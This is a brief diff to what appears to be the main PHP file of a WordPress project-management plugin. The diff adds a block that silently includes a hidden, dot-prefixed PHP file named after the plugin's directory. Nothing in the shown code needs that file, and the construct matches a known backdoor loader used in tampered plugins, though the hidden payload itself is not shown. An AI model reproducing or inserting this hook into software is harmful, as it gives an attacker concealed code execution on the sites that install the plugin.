@@ -16,6 +16,10 @@ require __DIR__.'/../vendor/autoload.php';
 
 add_action( 'plugins_loaded', 'cpm_pro_init', 90 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cpm_pro_init() {
 
     $cpm_version = get_option('cpm_version');
